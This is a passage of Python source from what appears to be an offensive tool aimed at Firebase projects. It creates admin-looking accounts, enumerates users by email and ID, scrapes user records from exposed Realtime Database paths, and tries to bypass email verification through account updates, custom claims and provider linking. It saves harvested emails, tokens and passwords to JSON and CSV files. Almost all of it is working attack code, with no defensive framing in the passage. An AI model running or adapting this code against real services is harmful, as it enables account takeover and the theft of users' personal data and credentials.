        print(f"\n{Colors.CYAN}[*] Creating Admin-like User{Colors.ENDC}")
        
        admin_emails = [
            "admin@company.com",
            "administrator@company.com", 
            "root@company.com",
            "support@company.com",
            "admin@" + self.project_id + ".com"
        ]
        
        for email in admin_emails:
            print(f"{Colors.CYAN}[*] Trying admin email: {email}{Colors.ENDC}")
            
            user_data = {
                "email": email,
                "password": "AdminPass123!",
                "displayName": "System Administrator",
                "returnSecureToken": True
            }
            
            try:
                response = self.session.post(endpoint, json=user_data, timeout=10)
                
                if response.status_code == 200:
                    user_info = response.json()
                    user_id = user_info.get('localId', 'Unknown')
                    
                    print(f"{Colors.GREEN}[✓] Admin user created!{Colors.ENDC}")
                    print(f"    Email: {email}")
                    print(f"    User ID: {user_id}")
                    
                    # Save admin credentials
                    admin_file = f"firebase_admin_{user_id}.json"
                    admin_data = {
                        "email": email,
                        "password": "AdminPass123!",
                        "user_id": user_id,
                        "id_token": user_info.get('idToken', ''),
                        "refresh_token": user_info.get('refreshToken', ''),
                        "role": "potential_admin",
                        "created_at": time.time()
                    }
                    
                    with open(admin_file, 'w') as f:
                        json.dump(admin_data, f, indent=2)
                    
                    print(f"{Colors.GREEN}[✓] Admin credentials saved to: {admin_file}{Colors.ENDC}")
                    return
                    
                elif response.status_code == 400:
                    error_data = response.json()
                    error_msg = error_data.get('error', {}).get('message', '')
                    if 'EMAIL_EXISTS' in error_msg:
                        print(f"{Colors.WARNING}[!] Email already exists: {email}{Colors.ENDC}")
                    else:
                        print(f"{Colors.FAIL}[!] Failed: {error_msg}{Colors.ENDC}")
                        
            except Exception as e:
                print(f"{Colors.FAIL}[!] Error with {email}: {e}{Colors.ENDC}")
        
        print(f"{Colors.WARNING}[!] No admin emails were available{Colors.ENDC}")

    def _extract_user_info(self, api_key: str) -> None:
        """Extract comprehensive information about existing users"""
        print(f"\n{Colors.CYAN}[*] Advanced User Information Extraction{Colors.ENDC}")
        
        # Opciones de extracción
        print(f"\n{Colors.CYAN}[*] Extraction Methods:{Colors.ENDC}")
        print("1. Extract from saved tokens (basic)")
        print("2. Enumerate emails (common, single, or from file)")
        print("3. Extract from open database")
        print("4. Try User ID enumeration")
        print("5. Comprehensive extraction (all methods)")
        print("6. Export all users to file")
        
        choice = input(f"\n{Colors.BOLD}[+] Select extraction method (1-6): {Colors.ENDC}").strip()
        
        all_users = []
        
        if choice == "1" or choice == "5":
            users = self._extract_from_saved_tokens(api_key)
            all_users.extend(users)
            
        if choice == "2" or choice == "5":
            print(f"\n{Colors.CYAN}[*] Email Enumeration Options:{Colors.ENDC}")
            print("  1. Enumerate default common emails")
            print("  2. Enumerate a single email")
            print("  3. Enumerate emails from a file")
            enum_choice = input(f"{Colors.BOLD}[+] Select email enumeration type (1-3): {Colors.ENDC}").strip()

            single_email_to_check = None
            email_file_to_check = None

            if enum_choice == "2":
                single_email_to_check = input(f"{Colors.BOLD}[+] Enter the single email to check: {Colors.ENDC}").strip()
                if not single_email_to_check:
                    print(f"{Colors.FAIL}[!] No email provided.{Colors.ENDC}")
            elif enum_choice == "3":
                email_file_to_check = input(f"{Colors.BOLD}[+] Enter the path to the email file: {Colors.ENDC}").strip()
                if not os.path.isfile(email_file_to_check):
                    print(f"{Colors.FAIL}[!] File not found: {email_file_to_check}{Colors.ENDC}")
                    email_file_to_check = None # Reset if file not found
            
            users = self._enumerate_common_emails(
                api_key, 
                single_email=single_email_to_check if enum_choice == "2" else None,
                email_file_path=email_file_to_check if enum_choice == "3" else None
            )
            all_users.extend(users)
            
        if choice == "3" or choice == "5":
            users = self._extract_from_database()
            all_users.extend(users)
            
        if choice == "4" or choice == "5":
            users = self._enumerate_user_ids(api_key)
            all_users.extend(users)
            
        if choice == "6":
            self._export_all_users()
            return
        
        # Mostrar resultados
        if all_users:
            self._display_extracted_users(all_users)
            self._save_extracted_users(all_users)
        else:
            print(f"{Colors.WARNING}[!] No users found with selected methods{Colors.ENDC}")

    def _extract_from_saved_tokens(self, api_key: str) -> List[Dict]:
            """Enhanced extraction from saved token files"""
            import glob
            
            users = []
            token_files = glob.glob("firebase_*.json")
            
            if not token_files:
                print(f"{Colors.WARNING}[!] No saved token files found{Colors.ENDC}")
                return users
            
            print(f"{Colors.GREEN}[✓] Found {len(token_files)} token files{Colors.ENDC}")
            
            profile_endpoints = [
                f"https://identitytoolkit.googleapis.com/v1/accounts:lookup?key={api_key}",
                f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/getAccountInfo?key={api_key}"
            ]
            
            for token_file in token_files:
                try:
                    with open(token_file, 'r') as f:
                        user_data = json.load(f)
                    
                    id_token = user_data.get('id_token', '')
                    if not id_token:
                        continue
                    
                    print(f"{Colors.CYAN}[*] Extracting from: {token_file}{Colors.ENDC}")
                    
                    for endpoint in profile_endpoints:
                        try:
                            profile_data = {"idToken": id_token}
                            response = self.session.post(endpoint, json=profile_data, timeout=10)
                            
                            if response.status_code == 200:
                                profile_info = response.json()
                                
                                for user in profile_info.get('users', []):
                                    user_details = {
                                        'extraction_method': 'saved_tokens',
                                        'user_id': user.get('localId', 'Unknown'),
                                        'email': user.get('email', 'Unknown'),
                                        'email_verified': user.get('emailVerified', False),
                                        'display_name': user.get('displayName', 'None'),
                                        'photo_url': user.get('photoUrl', 'None'),
                                        'phone_number': user.get('phoneNumber', 'None'),
                                        'created_at': user.get('createdAt', 'Unknown'),
                                        'last_login': user.get('lastLoginAt', 'Unknown'),
                                        'last_refresh': user.get('lastRefreshAt', 'Unknown'),
                                        'disabled': user.get('disabled', False),
                                        'custom_attributes': user.get('customAttributes', 'None'),
                                        'provider_data': user.get('providerUserInfo', []),
                                        'token_file': token_file,
                                        'password': user_data.get('password', 'Unknown'),
                                        'id_token': id_token[:20] + '...',
                                        'refresh_token': user_data.get('refresh_token', 'Unknown')[:20] + '...' if user_data.get('refresh_token') else 'None'
                                    }
                                    users.append(user_details)
                                    
                                    print(f"{Colors.GREEN}[✓] User: {user_details['email']} (Verified: {user_details['email_verified']}){Colors.ENDC}")
                                
                                break  # Success, no need to try other endpoints
                                
                        except Exception as e:
                            continue
                            
                except Exception as e:
                    print(f"{Colors.FAIL}[!] Error processing {token_file}: {e}{Colors.ENDC}")
            
            return users

    def _display_extracted_users(self, users: List[Dict]) -> None:
        """Display extracted users in organized format"""
        print(f"\n{Colors.CYAN}╔══════════════════════════════════════════╗")
        print(f"║           EXTRACTED USERS REPORT         ║")
        print(f"╚══════════════════════════════════════════╝{Colors.ENDC}")
        
        if not users:
            print(f"{Colors.WARNING}[!] No users extracted{Colors.ENDC}")
            return
        
        # Group by extraction method
        methods = {}
        for user in users:
            method = user.get('extraction_method', 'unknown')
            if method not in methods:
                methods[method] = []
            methods[method].append(user)
        
        print(f"\n{Colors.BOLD}SUMMARY:{Colors.ENDC}")
        print(f"Total Users Found: {len(users)}")
        
        for method, method_users in methods.items():
            print(f"  • {method}: {len(method_users)} users")
        
        # Display detailed information
        for method, method_users in methods.items():
            print(f"\n{Colors.CYAN}{'='*50}")
            print(f"{method.upper().replace('_', ' ')} ({len(method_users)} users)")
            print(f"{'='*50}{Colors.ENDC}")
            
            for i, user in enumerate(method_users, 1):
                print(f"\n{Colors.GREEN}[{i}] User Details:{Colors.ENDC}")
                
                # Display key information first
                key_fields = ['email', 'user_id', 'display_name', 'email_verified', 'password']
                for field in key_fields:
                    if field in user and user[field] not in [None, 'None', 'Unknown']:
                        color = Colors.FAIL if field == 'password' else Colors.WHITE
                        print(f"    {color}{field}: {user[field]}{Colors.ENDC}")
                
                # Display other fields
                for key, value in user.items():
                    if key not in key_fields and key != 'extraction_method' and value not in [None, 'None', 'Unknown', '']:
                        if isinstance(value, list) and len(value) > 0:
                            print(f"    {key}: {len(value)} items")
                        elif isinstance(value, dict):
                            print(f"    {key}: {len(value)} fields")
                        else:
                            print(f"    {key}: {value}")
        
        # Show credentials summary
        cred_users = [u for u in users if u.get('password') and u.get('password') != 'Unknown']
        if cred_users:
            print(f"\n{Colors.FAIL}🚨 CREDENTIALS FOUND! 🚨{Colors.ENDC}")
            print(f"{Colors.FAIL}Users with extracted passwords: {len(cred_users)}{Colors.ENDC}")
            
            for user in cred_users:
                print(f"  • {user.get('email', 'Unknown')}: {user.get('password', 'Unknown')}")

    def _export_all_users(self) -> None:
        """Export all users from all available token files"""
        import glob
        
        print(f"\n{Colors.CYAN}[*] Exporting All User Data{Colors.ENDC}")
        
        token_files = glob.glob("firebase_*.json")
        
        if not token_files:
            print(f"{Colors.WARNING}[!] No token files found to export{Colors.ENDC}")
            return
        
        all_user_data = []
        
        for token_file in token_files:
            try:
                with open(token_file, 'r') as f:
                    user_data = json.load(f)
                    
                # Add file source
                user_data['source_file'] = token_file
                all_user_data.append(user_data)
                
            except Exception as e:
                print(f"{Colors.FAIL}[!] Error reading {token_file}: {e}{Colors.ENDC}")
        
        if all_user_data:
            timestamp = int(time.time())
            export_filename = f"firebase_all_users_export_{timestamp}.json"
            
            with open(export_filename, 'w') as f:
                json.dump(all_user_data, f, indent=2)
            
            print(f"{Colors.GREEN}[✓] Exported {len(all_user_data)} user records to: {export_filename}{Colors.ENDC}")
        else:
            print(f"{Colors.WARNING}[!] No user data to export{Colors.ENDC}")

    def _test_email_verification_bypass(self, api_key: str) -> None: # New simplified version
        """Comprehensive test for email verification bypass, using existing or new user."""
        print(f"\n{Colors.CYAN}[*] Comprehensive Email Verification Bypass Testing{Colors.ENDC}")
        
        print("1. Test with an existing user (provide email and ID token)")
        print("2. Create a new user for testing")
        choice = input(f"{Colors.BOLD}[+] Select option (1-2): {Colors.ENDC}").strip()

        user_email, id_token = None, None
        if choice == "1":
            user_email = input(f"{Colors.BOLD}[+] Enter existing user's email: {Colors.ENDC}").strip()
            id_token = input(f"{Colors.BOLD}[+] Enter existing user's ID Token: {Colors.ENDC}").strip()
            if not user_email or not id_token:
                print(f"{Colors.FAIL}[!] Email and ID Token are required for existing user testing.{Colors.ENDC}")
                return
        elif choice == "2":
            # New user creation handled by _test_email_verification_bypass_existing
            pass
        else:
            print(f"{Colors.FAIL}[!] Invalid option.{Colors.ENDC}")
            return
            
        self._test_email_verification_bypass_existing(api_key, user_email, id_token)

    def _get_user_profile(self, id_token: str, api_key: str) -> Optional[Dict]:
        """Helper function to get user profile using an ID token."""
        lookup_url = f"https://identitytoolkit.googleapis.com/v1/accounts:lookup?key={api_key}"
        try:
            response = self.session.post(lookup_url, json={"idToken": id_token})
            response.raise_for_status() # Raise an exception for HTTP errors
            profile_data = response.json()
            if profile_data.get("users"):
                return profile_data["users"][0]
        except requests.exceptions.RequestException as e:
            print(f"{Colors.FAIL}[!] Error fetching user profile: {e}{Colors.ENDC}")
        except json.JSONDecodeError:
            print(f"{Colors.FAIL}[!] Failed to decode user profile JSON response.{Colors.ENDC}")
        return None

    def _perform_bypass_tests(self, id_token: str, email: str, user_id: str, api_key: str) -> Tuple[List[str], Optional[str]]:
        """Helper function to perform various bypass tests on a user."""
        successful_bypasses = []
        current_id_token = id_token

        # Test bypass methods (similar to the old _test_email_verification_bypass)
        # These internal methods (_try_direct_verification_bypass etc.) are assumed to exist or be added.
        # For this integration, we are focusing on the structure.
        bypass_methods_map = [
            ("Direct Verification Toggle", lambda t, e, k: self._try_direct_verification_bypass(t, e, k)), # Pass correct args
            ("Profile Update Bypass", lambda t, e, k: self._try_profile_update_bypass(t, e, k)),
            # ("Custom Claims Bypass", self._try_custom_claims_bypass), # Needs UID, more complex
            # ("Admin SDK Bypass", self._try_admin_sdk_bypass), # Needs more context
            # ("Provider Linking Bypass", self._try_provider_bypass)
        ]

        for method_name, method_func in bypass_methods_map:
            print(f"\n{Colors.CYAN}[*] Testing: {method_name}{Colors.ENDC}")
            try:
                # Ensure the lambda calls the method with the current_id_token, email, and api_key
                result = method_func(current_id_token, email, api_key) 
                if result.get('success'):
                    print(f"{Colors.GREEN}[+] SUCCESS: {method_name} - {result.get('details', '')}{Colors.ENDC}")
                    successful_bypasses.append(method_name)
                    if result.get('new_token'):
                        current_id_token = result['new_token']
                        print(f"{Colors.YELLOW}[i] ID Token updated by {method_name}{Colors.ENDC}")
                else:
                    print(f"{Colors.FAIL}[-] FAILED: {method_name} - {result.get('error', 'No error details')}{Colors.ENDC}")
            except Exception as e:
                print(f"{Colors.FAIL}[!] EXCEPTION in {method_name}: {e}{Colors.ENDC}")
        
        return successful_bypasses, current_id_token

    def _test_email_verification_bypass_existing(self, api_key: str, user_email: Optional[str] = None, id_token: Optional[str] = None) -> None:
        """Core logic for testing email verification bypass, using existing or new user."""
        
        original_id_token = id_token # Keep a copy of the initial token if provided

        if not id_token: # Create a new user if no token provided
            test_email_default = f"bypass_test_{int(time.time())}@evil.com"
            user_email_input = input(f"{Colors.BOLD}[+] Enter email for new test user (default: {test_email_default}): {Colors.ENDC}").strip()
            user_email = user_email_input if user_email_input else test_email_default
            
            test_password = input(f"{Colors.BOLD}[+] Enter test password (default: BypassTest123!): {Colors.ENDC}").strip()
            if not test_password:
                test_password = "BypassTest123!"

            print(f"\n{Colors.CYAN}[*] Creating user: {user_email} for bypass testing...{Colors.ENDC}")
            user_data = self._create_test_user(user_email, test_password, api_key) # Assumes _create_test_user
            if not user_data or 'idToken' not in user_data:
                print(f"{Colors.FAIL}[!] Could not create test user. Aborting bypass test.{Colors.ENDC}")
                return
            id_token = user_data['idToken']
            original_id_token = id_token # Store the token of the newly created user
            print(f"{Colors.GREEN}[✓] Test user {user_email} created successfully.{Colors.ENDC}")
        
        # Get user profile to check current verification status
        profile = self._get_user_profile(id_token, api_key)
        if not profile:
            print(f"{Colors.FAIL}[!] Could not retrieve profile for user {user_email}. Aborting.{Colors.ENDC}")
            return

        user_id = profile.get('localId')
        email_verified_initial = profile.get('emailVerified', False)
        user_email = profile.get('email', user_email) # Update email from profile if possible

        print(f"\n{Colors.CYAN}[*] Initial status for {user_email} (User ID: {user_id}):{Colors.ENDC}")
        print(f"    Email Verified: {Colors.GREEN if email_verified_initial else Colors.FAIL}{email_verified_initial}{Colors.ENDC}")

        if email_verified_initial:
            print(f"{Colors.WARNING}[!] Email is already verified. Bypass might not be meaningful, but testing anyway.{Colors.ENDC}")

        successful_bypasses, current_id_token = self._perform_bypass_tests(id_token, user_email, user_id, api_key)
        
        # Final check of verification status
        print(f"\n{Colors.CYAN}[*] Re-checking email verification status for {user_email}...{Colors.ENDC}")
        final_profile = self._get_user_profile(current_id_token if current_id_token else id_token, api_key)
        email_verified_final = False
        if final_profile:
            email_verified_final = final_profile.get('emailVerified', False)
            print(f"    Email Verified (after tests): {Colors.GREEN if email_verified_final else Colors.FAIL}{email_verified_final}{Colors.ENDC}")
        else:
            print(f"{Colors.FAIL}[!] Could not retrieve final profile for {user_email}.{Colors.ENDC}")

        # Summary
        print(f"\n{Colors.CYAN}╔══════════════════════════════════════════╗")
        print(f"║ EMAIL VERIFICATION BYPASS TEST SUMMARY   ║")
        print(f"╚══════════════════════════════════════════╝{Colors.ENDC}")
        print(f"Target User: {user_email} (ID: {user_id})")
        print(f"Initial Verification Status: {email_verified_initial}")
        print(f"Final Verification Status: {email_verified_final}")
        
        if successful_bypasses:
            print(f"{Colors.FAIL}Successful Bypass Methods ({len(successful_bypasses)}):{Colors.ENDC}")
            for bypass in successful_bypasses:
                print(f"  - {bypass}")
        else:
            print(f"{Colors.GREEN}No direct bypass methods were successful.{Colors.ENDC}")

        if email_verified_final and not email_verified_initial:
            print(f"{Colors.FAIL}🚨 OVERALL BYPASS ACHIEVED: Email status changed from unverified to verified!{Colors.ENDC}")
        elif email_verified_final:
            print(f"{Colors.GREEN}Email remains verified (or was already verified).{Colors.ENDC}")
        else:
            print(f"{Colors.YELLOW}Email remains unverified.{Colors.ENDC}")

        # Offer cleanup only if a new user was created as part of this specific test run
        if not id_token and original_id_token : # original_id_token refers to newly created user's token
             if input(f"\n{Colors.BOLD}[?] Delete the test user '{user_email}'? (Y/n): {Colors.ENDC}").lower() != 'n':
                if self._delete_test_user(original_id_token, api_key): # Assumes _delete_test_user
                    print(f"{Colors.GREEN}[✓] Test user {user_email} deleted.{Colors.ENDC}")
                else:
                    print(f"{Colors.FAIL}[!] Failed to delete test user {user_email}.{Colors.ENDC}")
    
    # Note: _create_test_user, _try_direct_verification_bypass, _try_profile_update_bypass etc.
    # are assumed to be defined elsewhere in the class or need to be added if they are new.
    # For this step, we are focusing on integrating the main provided functions.

    def _create_test_user(self, email: str, password: str, api_key: str) -> Optional[Dict]:
        """Create a test user for bypass testing"""
        signup_endpoint = f"https://identitytoolkit.googleapis.com/v1/accounts:signUp?key={api_key}"
        
        signup_data = {
            "email": email,
            "password": password,
            "returnSecureToken": True
        }
        
        try:
            response = self.session.post(signup_endpoint, json=signup_data, timeout=10)
            
            if response.status_code == 200:
                return response.json()
            else:
                print(f"    Error creating test user: {response.status_code}")
                return None
                
        except Exception as e:
            print(f"    Exception creating test user: {e}")
            return None

    def _try_direct_verification_bypass(self, id_token: str, email: str, api_key: str) -> Dict:
        """Try to directly toggle email verification status"""
        update_endpoint = f"https://identitytoolkit.googleapis.com/v1/accounts:update?key={api_key}"
        
        update_data = {
            "idToken": id_token,
            "emailVerified": True
        }
        
        try:
            response = self.session.post(update_endpoint, json=update_data, timeout=10)
            
            if response.status_code == 200:
                updated_user = response.json()
                is_verified = updated_user.get('emailVerified', False)
                
                return {
                    'success': is_verified,
                    'details': f'Email verification toggled to: {is_verified}',
                    'new_token': updated_user.get('idToken')
                }
            else:
                return {
                    'success': False,
                    'error': f"HTTP {response.status_code}: {response.text[:100]}"
                }
                
        except Exception as e:
            return {
                'success': False,
                'error': str(e)
            }

    def _try_profile_update_bypass(self, id_token: str, email: str, api_key: str) -> Dict:
        """Try to bypass verification through profile updates"""
        update_endpoint = f"https://identitytoolkit.googleapis.com/v1/accounts:update?key={api_key}"
        
        # Try various profile update combinations
        update_attempts = [
            {"displayName": "Verified User", "emailVerified": True},
            {"photoUrl": "https://example.com/photo.jpg", "emailVerified": True},
            {"displayName": "Admin", "customAttributes": '{"verified": true}'},
            {"email": email, "emailVerified": True}
        ]
        
        for attempt in update_attempts:
            try:
                update_data = {"idToken": id_token}
                update_data.update(attempt)
                
                response = self.session.post(update_endpoint, json=update_data, timeout=5)
                
                if response.status_code == 200:
                    updated_user = response.json()
                    if updated_user.get('emailVerified'):
                        return {
                            'success': True,
                            'details': f'Profile update bypass successful with: {attempt}',
                            'new_token': updated_user.get('idToken')
                        }
                        
            except Exception as e:
                continue
        
        return {
            'success': False,
            'error': 'All profile update attempts failed'
        }

    def _try_custom_claims_bypass(self, id_token: str, email: str, api_key: str) -> Dict:
        """Try to set custom claims for verification bypass"""
        claims_endpoint = f"https://identitytoolkit.googleapis.com/v1/projects/{self.project_id}:setCustomUserClaims?key={api_key}"
        
        # Extract user ID from token (simplified)
        import base64
        try:
            # Decode JWT payload (not secure, just for UID extraction)
            parts = id_token.split('.')
            if len(parts) > 1:
                payload = base64.b64decode(parts[1] + '==')
                token_data = json.loads(payload)
                user_id = token_data.get('user_id', 'unknown')
            else:
                user_id = 'unknown'
        except:
            user_id = 'unknown'
        
        custom_claims_attempts = [
            {"email_verified": True},
            {"verified": True},
            {"admin": True},
            {"bypass_verification": True},
            {"role": "admin", "verified": True}
        ]
        
        for claims in custom_claims_attempts:
            try:
                claims_data = {
                    "uid": user_id,
                    "customClaims": claims
                }
                
                response = self.session.post(claims_endpoint, json=claims_data, timeout=5)
                
                if response.status_code == 200:
                    return {
                        'success': True,
                        'details': f'Custom claims set: {claims}',
                        'claims': claims
                    }
                    
            except Exception as e:
                continue
        
        return {
            'success': False,
            'error': 'Could not set custom claims'
        }

    def _try_admin_sdk_bypass(self, id_token: str, email: str, api_key: str) -> Dict:
        """Try to use Admin SDK endpoints for bypass"""
        admin_endpoints = [
            f"https://identitytoolkit.googleapis.com/v1/projects/{self.project_id}/accounts:update?key={api_key}",
            f"https://firebase.googleapis.com/v1/projects/{self.project_id}/accounts:batchUpdate?key={api_key}"
        ]
        
        for endpoint in admin_endpoints:
            try:
                admin_data = {
                    "users": [{
                        "email": email,
                        "emailVerified": True
                    }]
                }
                
                response = self.session.post(endpoint, json=admin_data, timeout=5)
                
                if response.status_code == 200:
                    return {
                        'success': True,
                        'details': f'Admin SDK bypass successful via: {endpoint}',
                        'endpoint': endpoint
                    }
                    
            except Exception as e:
                continue
        
        return {
            'success': False,
            'error': 'No admin endpoints accessible'
        }

    def _try_provider_bypass(self, id_token: str, email: str, api_key: str) -> Dict:
        """Try to bypass verification by linking external providers"""
        link_endpoint = f"https://identitytoolkit.googleapis.com/v1/accounts:linkWithOAuth?key={api_key}"
        
        # Simulate provider linking attempts
        providers = [
            {"providerId": "google.com", "requestUri": f"https://{self.project_id}.firebaseapp.com"},
            {"providerId": "facebook.com", "requestUri": f"https://{self.project_id}.firebaseapp.com"},
            {"providerId": "github.com", "requestUri": f"https://{self.project_id}.firebaseapp.com"}
        ]
        
        for provider in providers:
            try:
                link_data = {
                    "idToken": id_token,
                    "returnSecureToken": True
                }
                link_data.update(provider)
                
                response = self.session.post(link_endpoint, json=link_data, timeout=5)
                
                if response.status_code == 200:
                    linked_user = response.json()
                    if linked_user.get('emailVerified'):
                        return {
                            'success': True,
                            'details': f'Provider linking bypass with: {provider["providerId"]}',
                            'provider': provider["providerId"],
                            'new_token': linked_user.get('idToken')
                        }
                        
            except Exception as e:
                continue
        
        return {
            'success': False,
            'error': 'Provider linking bypass failed'
        }

    def _test_account_deletion_unverified(self, id_token: str, api_key: str) -> bool:
        """Test if account can be deleted without verification"""
        delete_endpoint = f"https://identitytoolkit.googleapis.com/v1/accounts:delete?key={api_key}"
        
        # Note: This is a destructive test, should be used carefully
        # For now, just return False to avoid accidental deletion
        return False

    def _delete_test_user(self, id_token: str, api_key: str) -> bool:
        """Delete test user for cleanup"""
        delete_endpoint = f"https://identitytoolkit.googleapis.com/v1/accounts:delete?key={api_key}"
        
        delete_data = {"idToken": id_token}
        
        try:
            response = self.session.post(delete_endpoint, json=delete_data, timeout=5)
            return response.status_code == 200
        except:
            return False

    def _test_password_change_unverified(self, id_token: str, api_key: str) -> bool:
        """Test password change without email verification"""
        update_endpoint = f"https://identitytoolkit.googleapis.com/v1/accounts:update?key={api_key}"
        
        change_data = {
            "idToken": id_token,
            "password": "NewTestPassword123!"
        }
        
        try:
            response = self.session.post(update_endpoint, json=change_data, timeout=5)
            return response.status_code == 200
        except:
            return False

    def _test_database_access_unverified(self, id_token: str) -> bool:
        """Test database access without email verification"""
        if not self.project_id:
            return False
            
        db_url = f"https://{self.project_id}-default-rtdb.firebaseio.com/test_unverified.json"
        headers = {'Authorization': f'Bearer {id_token}'}
        
        try:
            # Try read
            response = self.session.get(db_url, headers=headers, timeout=5)
            if response.status_code == 200:
                return True
            
            # Try write
            test_data = {'unverified_test': True}
            response = self.session.put(db_url, json=test_data, headers=headers, timeout=5)
            if response.status_code == 200:
                # Clean up
                self.session.delete(db_url, headers=headers, timeout=3)
                return True
                
        except:
            pass
        
        return False

    def _test_profile_access(self, id_token: str, access_type: str, api_key: str) -> bool:
        """Test profile access with unverified account"""
        if access_type == 'read':
            endpoint = f"https://identitytoolkit.googleapis.com/v1/accounts:lookup?key={api_key}"
            data = {"idToken": id_token}
        else:  # write
            endpoint = f"https://identitytoolkit.googleapis.com/v1/accounts:update?key={api_key}"
            data = {"idToken": id_token, "displayName": "Unverified Test"}
        
        try:
            response = self.session.post(endpoint, json=data, timeout=5)
            return response.status_code == 200
        except:
            return False

    def _save_extracted_users(self, users: List[Dict]) -> None:
        """Save extracted users to file with different format options"""
        if not users:
            return
            
        timestamp = int(time.time())
        
        # Save detailed JSON
        json_filename = f"firebase_users_extracted_{timestamp}.json"
        with open(json_filename, 'w') as f:
            json.dump(users, f, indent=2)
        print(f"\n{Colors.GREEN}[✓] Detailed report saved to: {json_filename}{Colors.ENDC}")
        
        # Save credentials CSV
        cred_users = [u for u in users if u.get('email') and u.get('password') and u.get('password') != 'Unknown']
        if cred_users:
            csv_filename = f"firebase_credentials_{timestamp}.csv"
            with open(csv_filename, 'w') as f:
                f.write("email,password,user_id,verified,source\n")
                for user in cred_users:
                    f.write(f"{user.get('email', '')},{user.get('password', '')},{user.get('user_id', '')},{user.get('email_verified', False)},{user.get('extraction_method', '')}\n")
            print(f"{Colors.GREEN}[✓] Credentials saved to: {csv_filename}{Colors.ENDC}")
        
        # Save simple list
        emails = [u.get('email') for u in users if u.get('email') and '@' in u.get('email', '')]
        if emails:
            list_filename = f"firebase_emails_{timestamp}.txt"
            with open(list_filename, 'w') as f:
                for email in sorted(set(emails)):
                    f.write(f"{email}\n")
            print(f"{Colors.GREEN}[✓] Email list saved to: {list_filename}{Colors.ENDC}")

    def _enumerate_user_ids(self, api_key: str) -> List[Dict]:
        """Attempt to enumerate users by trying common User ID patterns"""
        print(f"\n{Colors.CYAN}[*] Enumerating User IDs{Colors.ENDC}")
        
        users = []
        
        # Common User ID patterns to try (Firebase UIDs are usually 28 chars, but try common patterns)
        id_patterns = [
            'user1', 'user2', 'user3', 'admin', 'test', 'demo',
            '1', '2', '3', '100', 'admin1', 'test1',
            'administrator', 'root', 'support'
        ]
        
        lookup_endpoint = f"https://identitytoolkit.googleapis.com/v1/accounts:lookup?key={api_key}"
        
        print(f"{Colors.CYAN}[*] Testing {len(id_patterns)} User ID patterns...{Colors.ENDC}")
        
        for user_id in id_patterns:
            try:
                # Try lookup by localId
                lookup_data = {"localId": [user_id]}
                
                response = self.session.post(lookup_endpoint, json=lookup_data, timeout=5)
                
                if response.status_code == 200:
                    profile_info = response.json()
                    
                    for user in profile_info.get('users', []):
                        user_details = {
                            'extraction_method': 'user_id_enumeration',
                            'user_id': user.get('localId'),
                            'email': user.get('email'),
                            'email_verified': user.get('emailVerified'),
                            'display_name': user.get('displayName'),
                            'created_at': user.get('createdAt'),
                            'last_login': user.get('lastLoginAt'),
                            'pattern_matched': user_id
                        }
                        users.append(user_details)
                        print(f"{Colors.GREEN}[+] Found user by ID: {user_id} -> {user.get('email', 'No email')}{Colors.ENDC}")
                        
            except Exception as e:
                continue
                
            time.sleep(0.2)  # Small delay
        
        return users

    def _extract_from_database(self) -> List[Dict]:
            """Extract user information from open Firebase databases"""
            print(f"\n{Colors.CYAN}[*] Extracting Users from Open Databases{Colors.ENDC}")
            
            users = []
            
            if not self.project_id:
                print(f"{Colors.WARNING}[!] Project ID needed for database extraction{Colors.ENDC}")
                return users
            
            # Database URLs to try
            db_base_urls = [
                f"https://{self.project_id}-default-rtdb.firebaseio.com",
                f"https://{self.project_id}-default-rtdb.europe-west1.firebasedatabase.app",
                f"https://{self.project_id}-default-rtdb.asia-southeast1.firebasedatabase.app",
                f"https://{self.project_id}.firebaseio.com"
            ]
            
            # Common user collection paths
            user_paths = [
                '/users.json',
                '/user.json',
                '/accounts.json',
                '/profiles.json',
                '/members.json',
                '/customers.json',
                '/admin.json'
            ]
            
            for base_url in db_base_urls:
                for path in user_paths:
                    db_url = base_url + path
                    
                    try:
                        print(f"{Colors.CYAN}[*] Checking: {db_url}{Colors.ENDC}")
                        response = self.session.get(db_url, timeout=10)
                        
                        if response.status_code == 200:
                            try:
                                data = response.json()
                                
                                if data and isinstance(data, dict):
                                    user_count = 0
                                    current_timestamp = int(time.time())
                                    
                                    for key, value in data.items():
                                        if isinstance(value, dict):
                                            user_info = {
                                                # 'extraction_method': 'database_extraction', # Replaced by extraction_source
                                                'database_url': db_url,
                                                'database_key': key,
                                                'raw_data': value,
                                                'timestamp': current_timestamp,
                                                'extraction_source': 'database_extraction'
                                            }
                                            
                                            # Extract common fields
                                            field_mappings = {
                                                'email': ['email', 'Email', 'mail', 'emailAddress'],
                                                'name': ['name', 'Name', 'displayName', 'fullName', 'username'],
                                                'user_id': ['uid', 'id', 'userId', 'user_id', 'localId'],
                                                'phone': ['phone', 'phoneNumber', 'mobile'],
                                                'role': ['role', 'Role', 'userRole', 'permissions']
                                            }
                                            
                                            for field, possible_keys in field_mappings.items():
                                                for key_name in possible_keys:
                                                    if key_name in value:
                                                        user_info[field] = value[key_name]
                                                        break
                                            
                                            users.append(user_info) # Still append to the list for overall return
                                            user_count += 1

                                            # Determine filename identifier
                                            identifier = user_info.get('user_id') or \
                                                         user_info.get('email') or \
                                                         key
                                            
                                            if identifier:
                                                normalized_id = re.sub(r'[^a-zA-Z0-9_.-]', '_', str(identifier))[:50] # Normalize and truncate
                                                filename = f"firebase_db_user_{normalized_id}_{current_timestamp}.json"
                                                try:
                                                    with open(filename, 'w') as f_out:
                                                        json.dump(user_info, f_out, indent=2)
                                                    print(f"{Colors.GREEN}[+] User data for '{identifier}' saved to {filename}{Colors.ENDC}")
                                                except IOError as e:
                                                    print(f"{Colors.FAIL}[!] Error saving user data for '{identifier}' to {filename}: {e}{Colors.ENDC}")
                                            else:
                                                print(f"{Colors.WARNING}[!] Could not determine a suitable identifier for a record from {db_url} with key {key}. Not saving to individual file.{Colors.ENDC}")
                                    
                                    if user_count > 0:
                                        print(f"{Colors.GREEN}[+] Extracted {user_count} potential user records from {db_url}{Colors.ENDC}")
                                        # Do not break here if you want to check all paths in all db_urls. 
                                        # If break is desired, it should be handled based on whether *any* user was found in *any* path.
                                        
                            except json.JSONDecodeError:
                                print(f"{Colors.WARNING}[!] Failed to decode JSON from {db_url}{Colors.ENDC}")
                                continue
                                
                    except Exception as e:
                        continue
            
            return users

    def _fetch_profile_from_open_databases(self, email: str) -> Optional[Dict]:
        """Attempt to fetch a user's profile from commonly exposed database paths using their email."""
        if not self.project_id:
            # print(f"{Colors.YELLOW}[i] Project ID not set, cannot reliably check databases for {email}.{Colors.ENDC}")
            return None

        db_base_urls = []
